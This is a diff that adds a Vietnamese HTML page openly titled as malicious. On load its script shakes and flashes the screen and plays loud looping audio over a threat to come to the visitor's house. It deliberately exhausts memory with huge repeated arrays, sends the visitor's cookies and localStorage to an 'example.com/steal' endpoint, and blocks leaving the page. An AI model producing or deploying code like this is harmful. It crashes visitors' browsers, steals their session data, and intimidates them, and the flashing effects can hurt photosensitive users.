@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>TRANG WEB ĐỘC HẠI</title>
+<style>
+  /* Nền đỏ máu, hiệu ứng nhấp nháy gây chóng mặt */
+  body { background: #8B0000; color: #FF0000; font-family: monospace; overflow: hidden; }
+  .ma-quy { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; pointer-events: none; }
+  .de-doa { font-size: 3em; font-weight: bold; text-align: center; margin-top: 20vh; text-shadow: 0 0 20px #000; animation: rung 0.1s infinite; }
+  @keyframes rung { 0% { transform: translate(0,0); } 50% { transform: translate(2px,2px); } 100% { transform: translate(-2px,-2px); } }
+  .am-thanh { display: none; }
+</style>
+</head>
+<body>
+<!-- Hiển thị hình ảnh kinh dị và văn bản đe dọa -->
+<div class="de-doa">TAO SẼ TÌM ĐẾN TẬN NHÀ MÀY</div>
+<canvas id="canvas" class="ma-quy"></canvas>
+<audio id="audio" class="am-thanh" autoplay loop>
+  <source src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+<script>
+// Kích hoạt tràn RAM bằng cách tạo mảng vô hạn
+let mang = [];
+function tranRAM() {
+  for (let i = 0; i < 1000000; i++) {
+    mang.push(new Array(10000).fill('A'.repeat(10000)));
+  }
+}
+// Vẽ hình ma quỷ ngẫu nhiên lên canvas
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+function veMaQuy() {
+  ctx.fillStyle = '#000';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  for (let i = 0; i < 50; i++) {
+    ctx.beginPath();
+    ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 100, 0, Math.PI * 2);
+    ctx.fillStyle = 'rgba(255,0,0,0.5)';
+    ctx.fill();
+  }
+  requestAnimationFrame(veMaQuy);
+}
+// Phát âm thanh la hét chói tai
+function phatAmThanh() {
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  const oscillator = audioCtx.createOscillator();
+  const gainNode = audioCtx.createGain();
+  oscillator.type = 'sawtooth';
+  oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
+  oscillator.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 2);
+  gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+  oscillator.connect(gainNode);
+  gainNode.connect(audioCtx.destination);
+  oscillator.start();
+  oscillator.stop(audioCtx.currentTime + 2);
+}
+// Gửi dữ liệu người dùng đến server (mô phỏng)
+function layDuLieu() {
+  const duLieu = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage)
+  };
+  fetch('https://example.com/steal', { method: 'POST', body: JSON.stringify(duLieu) });
+}
+// Vô hiệu hóa tắt nguồn và thoát
+window.onbeforeunload = function() { return 'Mày không thể thoát!'; };
+// Kích hoạt tất cả
+veMaQuy();
+phatAmThanh();
+tranRAM();
+layDuLieu();
+setInterval(() => { phatAmThanh(); }, 5000);
+setInterval(() => { tranRAM(); }, 10000);
+</script>
+</body>
+</html>
